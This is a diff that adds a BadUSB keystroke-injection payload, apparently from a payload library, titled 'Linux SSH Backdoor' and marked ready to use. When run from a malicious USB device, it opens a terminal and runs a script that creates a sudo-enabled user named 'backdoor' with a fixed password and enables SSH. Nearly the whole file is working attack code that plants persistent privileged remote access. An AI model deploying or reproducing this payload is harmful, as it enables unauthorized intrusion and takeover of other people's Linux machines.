@@ -1,0 +1,35 @@
+REM Title: Linux SSH Backdoor
+REM Author: BadUSB Library
+REM Description: Creates SSH backdoor for remote access
+REM Target: Linux
+REM Category: Remote Access
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Create SSH backdoor
+STRING cat > /tmp/ssh_backdoor.sh << 'EOF'
+#!/bin/bash
+# Create backdoor user
+sudo useradd -m -s /bin/bash backdoor
+echo "backdoor:backdoor123" | sudo chpasswd
+sudo usermod -aG sudo backdoor
+sudo systemctl enable ssh
+sudo systemctl start ssh
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/ssh_backdoor.sh
+ENTER
+DELAY 1000
+
+STRING /tmp/ssh_backdoor.sh
+ENTER
+DELAY 3000
